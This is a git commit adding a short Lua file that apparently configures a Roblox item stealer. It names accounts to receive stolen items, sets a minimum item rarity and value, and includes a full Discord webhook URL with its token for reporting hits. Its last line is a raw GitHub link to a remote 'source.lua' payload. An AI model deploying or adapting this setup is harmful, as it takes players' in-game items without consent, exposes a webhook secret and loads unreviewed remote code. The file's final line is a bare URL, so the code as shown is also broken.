e6efd88d2dcb753191a53b338681f2b028034fde
xuxi587 <amrsmoothie@gmail.com>
2025-12-26 20:15:12 +0000

    Add files via upload

---
+++ head.lua
@@ -0,0 +1,7 @@
+_G.Usernames = {"MMrSmoothie", "user2", "user3"} -- you can add as many as you'd like
+_G.min_rarity = "Godly"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1454205079551873170/dQguTVQWfCf04PhkQjPq6AZq5FjYCwpdpTOYW2cBCnWz4ZqwubGZ_dHulU8Q_SzcOGH_" -- change to your webhook
+
+https://raw.githubusercontent.com/xuxi587/booga/refs/heads/main/source.lua
